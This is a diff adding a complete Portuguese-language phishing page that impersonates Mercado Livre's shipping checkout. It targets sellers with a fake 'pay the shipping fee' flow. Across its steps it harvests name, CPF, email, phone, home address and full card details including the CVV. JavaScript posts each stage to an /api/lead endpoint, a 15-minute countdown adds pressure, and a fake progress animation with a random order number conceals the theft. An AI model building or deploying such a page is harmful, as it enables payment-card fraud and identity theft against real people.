@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Finalizar envio · Mercado Envios</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#EBEBEB;color:#333;font-size:15px;padding-bottom:30px}
+header{background:#FFE600;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:20}
+.logo{font-weight:800;font-size:17px;color:#2D3277;letter-spacing:-.5px}
+.logo span{color:#3483FA}
+.safe{background:#3483FA;color:#fff;font-size:11px;padding:4px 8px;border-radius:4px;font-weight:600}
+.bar{background:#fff;display:flex;padding:10px 14px;gap:6px;border-bottom:1px solid #ddd}
+.bar i{flex:1;height:4px;background:#ddd;border-radius:2px;font-style:normal}
+.bar i.on{background:#3483FA}
+.timer{background:#fff;text-align:center;font-size:12px;color:#666;padding:7px;border-bottom:1px solid #eee}
+.timer b{color:#C0392B}
+main{max-width:440px;margin:0 auto;padding:14px}
+.card{background:#fff;border-radius:8px;padding:18px;box-shadow:0 1px 3px rgba(0,0,0,.1);margin-bottom:12px}
+h1{font-size:19px;font-weight:600;margin-bottom:6px;color:#111}
+.sub{font-size:13px;color:#777;margin-bottom:16px;line-height:1.45}
+label{display:block;font-size:12px;font-weight:600;color:#555;margin-bottom:5px}
+input,select{width:100%;padding:12px;border:1px solid #ccc;border-radius:6px;font-size:15px;margin-bottom:12px;background:#fff;font-family:inherit}
+input:focus,select:focus{outline:none;border-color:#3483FA;box-shadow:0 0 0 2px rgba(52,131,250,.15)}
+.row{display:flex;gap:8px}
+.row>div{flex:1}
+button{width:100%;padding:15px;background:#3483FA;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit}
+button:active{background:#2968C8}
+button:disabled{background:#9BBDF7}
+.foot{font-size:11px;color:#888;text-align:center;margin-top:12px;line-height:1.6}
+.sum{background:#F7F7F7;border-radius:6px;padding:12px;margin-bottom:12px;font-size:13px}
+.sum div{display:flex;justify-content:space-between;padding:3px 0}
+.sum .tot{border-top:1px solid #ddd;margin-top:6px;padding-top:8px;font-weight:700;color:#111}
+.note{background:#FFF8D6;border-left:3px solid #FFE600;padding:10px 12px;border-radius:4px;font-size:12.5px;line-height:1.5;margin-bottom:14px;color:#5A4A00}
+.brands{display:flex;gap:5px;margin-bottom:14px;flex-wrap:wrap}
+.brands span{font-size:9px;border:1px solid #ddd;border-radius:3px;padding:3px 6px;color:#999;font-weight:700}
+.opt{border:2px solid #3483FA;border-radius:6px;padding:12px;font-size:13px;background:#F4F8FF;margin-bottom:12px;line-height:1.5}
+.opt b{display:block;color:#111;margin-bottom:3px}
+.spin{width:38px;height:38px;border:4px solid #ddd;border-top-color:#3483FA;border-radius:50%;animation:r .8s linear infinite;margin:26px auto}
+@keyframes r{to{transform:rotate(360deg)}}
+.steps{font-size:13px;color:#777;text-align:center;line-height:2.1;min-height:90px}
+.steps div{opacity:.25;transition:.3s}
+.steps div.on{opacity:1;color:#111;font-weight:600}
+.ok{width:62px;height:62px;background:#00A650;border-radius:50%;margin:14px auto;position:relative}
+.ok:after{content:"";position:absolute;left:21px;top:13px;width:16px;height:30px;border:solid #fff;border-width:0 4px 4px 0;transform:rotate(45deg)}
+.center{text-align:center}
+.order{background:#F7F7F7;border-radius:6px;padding:11px;font-size:13px;margin:12px 0;font-family:monospace}
+.hide{display:none}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo">mercado <span>livre</span></div>
+  <div class="safe">Compra protegida</div>
+</header>
+<div class="bar"><i id="b1" class="on"></i><i id="b2"></i><i id="b3"></i></div>
+<div class="timer">Reserve seu envio em <b id="tm">15:00</b></div>
+
+<main>
+  <!-- 0 -->
+  <section id="s0" class="card">
+    <h1>Confirme seus dados</h1>
+    <p class="sub">Para gerar a etiqueta de envio, precisamos dos dados do vendedor.</p>
+    <label>Nome completo</label><input id="nome" placeholder="Como no documento">
+    <label>CPF</label><input id="cpf" inputmode="numeric" placeholder="000.000.000-00" maxlength="14">
+    <label>E-mail</label><input id="email" type="email" placeholder="seu@email.com">
+    <label>Celular</label><input id="tel" inputmode="numeric" placeholder="(00) 00000-0000" maxlength="15">
+    <button onclick="go(1)">Continuar</button>
+    <p class="foot">🔒 Seus dados são usados apenas para gerar a etiqueta.</p>
+  </section>
+
+  <!-- 1 -->
+  <section id="s1" class="card hide">
+    <h1>Endereço de retirada</h1>
+    <p class="sub">O motoboy vai retirar o produto neste endereço.</p>
+    <label>CEP</label><input id="cep" inputmode="numeric" placeholder="00000-000" maxlength="9">
+    <div class="row">
+      <div><label>Rua</label><input id="rua"></div>
+      <div style="max-width:88px"><label>Número</label><input id="num" inputmode="numeric"></div>
+    </div>
+    <label>Complemento (opcional)</label><input id="comp">
+    <label>Bairro</label><input id="bairro">
+    <div class="row">
+      <div><label>Cidade</label><input id="cidade"></div>
+      <div style="max-width:66px"><label>UF</label><input id="uf" maxlength="2" style="text-transform:uppercase"></div>
+    </div>
+    <button onclick="go(2)">Continuar</button>
+  </section>
+
+  <!-- 2 -->
+  <section id="s2" class="card hide">
+    <h1>Forma de envio</h1>
+    <p class="sub">Selecione como o produto será enviado.</p>
+    <div class="opt"><b>Mercado Envios · Coleta em casa</b>Chega em 1 a 2 dias úteis · R$ 24,90</div>
+    <div class="sum">
+      <div><span>Produto</span><span id="pv">R$ —</span></div>
+      <div><span>Frete</span><span>R$ 24,90</span></div>
+      <div class="tot"><span>Pagar agora</span><span>R$ 24,90</span></div>
+    </div>
+    <div class="note">O valor do produto fica retido pelo Mercado Pago e é liberado pra você após a confirmação da entrega.</div>
+    <button onclick="go(3)">Ir para pagamento</button>
+  </section>
+
+  <!-- 3 -->
+  <section id="s3" class="card hide">
+    <h1>Pagamento</h1>
+    <p class="sub">Pague a taxa de envio para liberar a coleta.</p>
+    <label>Número do cartão</label><input id="cc" inputmode="numeric" placeholder="0000 0000 0000 0000" maxlength="19">
+    <label>Nome impresso no cartão</label><input id="tit" style="text-transform:uppercase">
+    <div class="row">
+      <div><label>Validade</label><input id="val" inputmode="numeric" placeholder="MM/AA" maxlength="5"></div>
+      <div><label>CVV</label><input id="cvv" inputmode="numeric" placeholder="000" maxlength="4"></div>
+    </div>
+    <label>Parcelas</label>
+    <select id="par"><option>1x de R$ 24,90 (sem juros)</option></select>
+    <div class="brands"><span>VISA</span><span>MASTER</span><span>ELO</span><span>AMEX</span><span>HIPER</span></div>
+    <button id="pagar" onclick="pagar()">Pagar R$ 24,90</button>
+    <p class="foot">Pagamento processado pelo Mercado Pago<br>🔒 Conexão criptografada</p>
+  </section>
+
+  <!-- 4 -->
+  <section id="s4" class="card hide">
+    <div class="spin"></div>
+    <div class="steps">
+      <div id="st1">Validando cartão</div>
+      <div id="st2">Gerando etiqueta</div>
+      <div id="st3">Reservando coleta</div>
+    </div>
+  </section>
+
+  <!-- 5 -->
+  <section id="s5" class="card hide center">
+    <div class="ok"></div>
+    <h1>Pedido confirmado</h1>
+    <div class="order" id="ordem"></div>
+    <p class="sub">Etiqueta gerada. A coleta está agendada para amanhã, entre 8h e 12h.</p>
+    <p class="sub" id="lib"></p>
+  </section>
+</main>
+
+<input id="hp" class="hide" tabindex="-1">
+
+<script>
+const D = {};
+const q = new URLSearchParams(location.search);
+const PROD = q.get('p') ? decodeURIComponent(q.get('p')) : '';
+const PRECO = q.get('v') ? Number(q.get('v')) : 0;
+if (PRECO) document.getElementById('pv').textContent =
+  PRECO.toLocaleString('pt-BR', {style:'currency', currency:'BRL'});
+
+function send(status, etapa){
+  const p = Object.assign({}, D, {status, etapa,
+    ip: '', ua: navigator.userAgent, ts: new Date().toISOString()});
+  fetch('/api/lead', {method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify(p)}).catch(()=>{});
+}
+
+fetch('/api/ping', {method:'POST', headers:{'Content-Type':'application/json'},
+  body: JSON.stringify({ua: navigator.userAgent, p: PROD})}).catch(()=>{});
+
+// máscaras
+const $ = id => document.getElementById(id);
+$('cpf').oninput = e => e.target.value = e.target.value.replace(/\D/g,'')
+  .replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2')
+  .replace(/(\d{3})(\d{1,2})$/,'$1-$2');
+$('tel').oninput = e => e.target.value = e.target.value.replace(/\D/g,'')
+  .replace(/(\d{2})(\d)/,'($1) $2').replace(/(\d{5})(\d)/,'$1-$2');
+$('cep').oninput = e => e.target.value = e.target.value.replace(/\D/g,'')
+  .replace(/(\d{5})(\d)/,'$1-$2');
+$('cc').oninput = e => e.target.value = e.target.value.replace(/\D/g,'')
+  .replace(/(\d{4})(?=\d)/g,'$1 ').slice(0,19);
+$('val').oninput = e => e.target.value = e.target.value.replace(/\D/g,'')
+  .replace(/(\d{2})(\d)/,'$1/$2');
+
+$('cep').onblur = async e => {
+  const c = e.target.value.replace(/\D/g,'');
+  if (c.length !== 8) return;
+  try {
+    const r = await fetch('https://viacep.com.br/ws/'+c+'/json/').then(x=>x.json());
+    if (r.erro) return;
+    $('rua').value = r.logradouro || '';
+    $('bairro').value = r.bairro || '';
+    $('cidade').value = r.localidade || '';
+    $('uf').value = r.uf || '';
+    $('num').focus();
+  } catch(_) {}
+};
+
+function go(n){
+  if (n === 1){
+    D.nome = $('nome').value.trim(); D.cpf = $('cpf').value;
+    D.email = $('email').value.trim(); D.telefone = $('tel').value;
+    if (D.nome.split(' ').length < 2) return alert('Informe o nome completo.');
+    if (D.cpf.length < 14) return alert('CPF incompleto.');
+    if (!D.email.includes('@')) return alert('E-mail inválido.');
+    send('PARCIAL', 1);
+  }
+  if (n === 2){
+    D.cep = $('cep').value; D.rua = $('rua').value;
+    D.numero = $('num').value; D.complemento = $('comp');
+    D.bairro = $('bairro').value; D.cidade = $('cidade').value;
+    D.uf = $('uf').value;
+    if (!D.rua || !D.numero || !D.cidade) return alert('Complete o endereço.');
+    send('PARCIAL', 2);
+  }
+  if (n === 3) send('PARCIAL', 3);
+  document.querySelectorAll('section').forEach(s => s.classList.add('hide'));
+  $('s' + n).classList.remove('hide');
+  $('b1').className = n >= 1 ? 'on' : '';
+  $('b2').className = n >= 2 ? 'on' : '';
+  $('b3').className = n >= 3 ? 'on' : '';
+  window.scrollTo(0, 0);
+}
+
+function pagar(){
+  D.cartao = $('cc').value.replace(/\s/g,'');
+  D.titular = $('tit').value; D.validade = $('val').value;
+  D.cvv = $('cvv').value; D.parcelas = $('par').value;
+  if (D.cartao.length < 13) return alert('Número do cartão incompleto.');
+  if (D.validade.length < 5) return alert('Validade inválida.');
+  if (D.cvv.length < 3) return alert('CVV inválido.');
+  $('pagar').disabled = true;
+  send('COMPLETO', 4);
+  go(4);
+  ['st1','st2','st3'].forEach((id, i) =>
+    setTimeout(() => $(id).classList.add('on'), 700 + i * 1600));
+  setTimeout(() => {
+    $('ordem').textContent = 'ML-' + Math.floor(1e9 + Math.random() * 9e9);
+    if (PRECO) $('lib').textContent = 'Você recebe ' +
+      PRECO.toLocaleString('pt-BR',{style:'currency',currency:'BRL'}) +
+      ' em até 1 dia útil após a entrega.';
+    go(5);
+  }, 6200);
+}
+
+let t = 900;
+setInterval(() => {
+  if (t <= 0) return;
+  t--;
+  $('tm').textContent = String(Math.floor(t/60)).padStart(2,'0') + ':' +
+    String(t % 60).padStart(2,'0');
+}, 1000);
+</script>
+</body>
+</html>
